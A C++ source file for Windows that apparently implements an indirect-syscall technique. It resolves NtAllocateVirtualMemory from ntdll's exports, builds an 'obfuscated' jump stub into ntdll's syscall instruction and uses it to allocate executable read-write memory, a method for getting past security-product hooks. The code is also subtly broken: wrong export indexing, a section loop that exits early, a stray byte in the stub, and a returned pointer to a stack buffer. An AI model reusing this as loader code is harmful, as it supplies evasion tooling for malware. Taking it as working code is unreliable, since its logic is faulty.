#include <windows.h>
#include <stdio.h>
#include <psapi.h>

LPVOID Ptr_TextSection = NULL;
LPVOID Ptr_RdataSection = NULL;
LPVOID Ptr_exportDirectory = NULL;
LPVOID Ptr_FileData = NULL;

using myNtAllocateVirtualMemory = NTSTATUS(NTAPI*)(HANDLE ProcessHandle, PVOID* BaseAddress, ULONG ZeroBits, PSIZE_T RegionSize, ULONG AllocationType, ULONG Protect);


void* MyMemcpy(void* dest, const void* src, size_t count)
{
	if (dest == NULL || src == NULL)
	{
		return NULL;
	}

	char* tmp_dest = (char*)dest;
	const char* tmp_src = (const char*)src;

	while (count--) *tmp_dest++ = *tmp_src++;

	return dest;
}

PVOID RVAtoRawOffset(DWORD_PTR RVA, PIMAGE_SECTION_HEADER section)
{
	return (PVOID)RVA;
}

//Get NTDLL address
LPVOID GetNtdllAddr()
{
	HANDLE process = GetCurrentProcess();
	MODULEINFO mi;
	HMODULE ntdllModule = GetModuleHandleA("ntdll.dll");
	GetModuleInformation(process, ntdllModule, &mi, sizeof(mi));
	LPVOID ntdllBase = mi.lpBaseOfDll;
	Ptr_FileData = mi.lpBaseOfDll;

	PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)ntdllBase;
	PIMAGE_NT_HEADERS imageNTHeaders = (PIMAGE_NT_HEADERS)((DWORD_PTR)ntdllBase + dosHeader->e_lfanew);
	DWORD exportDirRVA = imageNTHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;
	PIMAGE_SECTION_HEADER section = IMAGE_FIRST_SECTION(imageNTHeaders);
	PIMAGE_SECTION_HEADER textSection = section;
	PIMAGE_SECTION_HEADER rdataSection = section;

	for (int i = 0; i < imageNTHeaders->FileHeader.NumberOfSections; i++)
	{
		if (strcmp((CHAR*)section->Name, (CHAR*)".text") == 0) {
			Ptr_TextSection = section;
			break;
		}
		if (strcmp((CHAR*)section->Name, (CHAR*)".rdata") == 0) {
			Ptr_RdataSection = section;
 			rdataSection = section;
			break;
		}
		section++;
	}
	PIMAGE_EXPORT_DIRECTORY exportDirectory = (PIMAGE_EXPORT_DIRECTORY)RVAtoRawOffset((DWORD_PTR)ntdllBase + exportDirRVA, rdataSection);
	return exportDirectory;
}

LPVOID GetFunctionStub(PIMAGE_EXPORT_DIRECTORY exportDirectory, LPVOID fileData, PIMAGE_SECTION_HEADER textSection, PIMAGE_SECTION_HEADER rdataSection, LPCSTR FunctionName)
{
	PDWORD addressOfNames = (PDWORD)RVAtoRawOffset((DWORD_PTR)fileData + *(&exportDirectory->AddressOfNames), rdataSection);
	PDWORD addressOfFunctions = (PDWORD)RVAtoRawOffset((DWORD_PTR)fileData + *(&exportDirectory->AddressOfFunctions), rdataSection);
	for (int i = 0; i < exportDirectory->NumberOfNames; i++)
	{

		DWORD_PTR functionNameVA = (DWORD_PTR)RVAtoRawOffset((DWORD_PTR)fileData + addressOfNames[i], rdataSection);
		DWORD_PTR functionVA = (DWORD_PTR)RVAtoRawOffset((DWORD_PTR)fileData + addressOfFunctions[i + 1], textSection);
		LPCSTR functionNameResolved = (LPCSTR)functionNameVA;

		if (strcmp(functionNameResolved, FunctionName) == 0)
		{
			return (LPVOID)functionVA;
		}
	}
	return (LPVOID)NULL;
}

char* createObfuscatedSyscall(LPVOID SyscallFunction) {
	//拿到syscall的编码地址
	LPVOID syscallAddress = (char*)SyscallFunction + 18;

	//将syscall放入r11
	unsigned char jumpPrelude[] = { 0x00, 0x49, 0xBB }; //mov r11
	unsigned char jumpAddress[] = { 0xDE, 0xAD, 0xBE, 0xEF, 0xDE, 0xAD, 0xBE, 0xEF }; //占位符
	*(void**)(jumpAddress) = syscallAddress; //替换地址
	unsigned char jumpEpilogue[] = { 0x41, 0xFF, 0xE3 , 0xC3 }; //jmp r11

	//全部复制到一个buf中
	char finalSyscall[30];
	MyMemcpy(finalSyscall, SyscallFunction, 7);
	MyMemcpy(finalSyscall + 7, jumpPrelude, 3);
	MyMemcpy(finalSyscall + 7 + 3, jumpAddress, sizeof(jumpAddress));
	MyMemcpy(finalSyscall + 7 + 3 + 8, jumpEpilogue, 4);

	//更改页保护属性
	DWORD oldProtect = NULL;
	VirtualProtectEx(GetCurrentProcess(), &finalSyscall, sizeof(finalSyscall), PAGE_EXECUTE_READWRITE, &oldProtect);

	return finalSyscall;
}

int main()
{
	LPVOID Memptr = NULL;
	SIZE_T Size = 300000;
	HANDLE fp;
	LPDWORD dwSize = 0;

	char s_NtAllocateVirtualMemory[] = { 'N','t','A','l','l','o','c','a','t','e','V','i','r','t','u','a','l','M','e','m','o','r','y',0 };
	Ptr_exportDirectory = GetNtdllAddr();
	LPVOID ntdllSyscallPointer = GetFunctionStub((PIMAGE_EXPORT_DIRECTORY)Ptr_exportDirectory, Ptr_FileData, (PIMAGE_SECTION_HEADER)Ptr_TextSection, (PIMAGE_SECTION_HEADER)Ptr_RdataSection, s_NtAllocateVirtualMemory);
	myNtAllocateVirtualMemory NtAllocateVirtualMemory = (myNtAllocateVirtualMemory)createObfuscatedSyscall(ntdllSyscallPointer);
	NtAllocateVirtualMemory(GetCurrentProcess(), &Memptr, 0, &Size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

	return 0;
}